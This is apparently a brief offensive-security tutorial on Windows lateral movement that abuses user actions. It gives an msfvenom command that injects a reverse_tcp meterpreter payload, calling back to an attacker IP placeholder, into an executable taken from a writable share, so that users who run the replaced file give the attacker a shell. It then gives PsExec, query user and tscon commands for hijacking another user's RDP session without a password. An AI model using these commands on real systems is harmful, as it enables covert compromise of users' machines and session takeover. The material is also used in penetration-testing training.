An attacker can take advantage of actions made by the users to gain further access to thier machines.

****Abusing Writable Shares****<br>

the shares files might be writable for some reasons, an attacker can plant specific files to force users into executing any arbitrary payload and gain access to their machines so if we find a **.exe** file we will download it from the share one and use our msfvenom to inject our payload into.
```
msfvenom -a x64 --platform windows -x file.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o FileAfter.exe
```
The resulting FileAfter.exe will execute a reverse_tcp meterpreter payload without the user noticing it. Once the file has been generated, we can replace the executable on the windows share and wait for any connections comming to us.


****RDP hijacking****

When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, his session will remain open on the server indefinitely.
If we have administator level access we should be the SYSTEM level to **take over any existing RDP session without requiring a password**.
Now we will use the ```PsExec64.exe``` to acheive that goal.
```
PsExec64.exe -s cmd.exe
```
To list the existing sessions on a server:
```
query user
```
Now we will use the ```tscon``` it's used in windows to connect (or transfer) a user session from one session to another.
```
tscon <SessionIdThatWeWillTransferTo> /dest:rdp-tcp#6
```











